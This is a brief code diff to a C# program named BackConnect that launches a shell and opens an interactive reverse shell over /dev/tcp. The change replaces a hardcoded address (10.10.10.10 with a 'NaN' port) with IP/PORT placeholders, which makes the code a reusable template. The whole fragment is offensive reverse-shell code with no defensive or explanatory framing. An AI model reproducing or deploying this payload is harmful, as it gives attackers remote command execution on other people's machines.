@@ -6,7 +6,7 @@ namespace BackConnect {
 	public static void Main(string[] args) {
 	  Process proc = new System.Diagnostics.Process();
 	  proc.StartInfo.FileName = "sh";
-	  proc.StartInfo.Arguments = "-c \"sh -i >& /dev/tcp/10.10.10.10/NaN 0>&1\"";
+	  proc.StartInfo.Arguments = "-c \"sh -i >& /dev/tcp/IP/PORT 0>&1\"";
 	  proc.StartInfo.UseShellExecute = false;
 	  proc.StartInfo.RedirectStandardOutput = true;
 	  proc.Start();
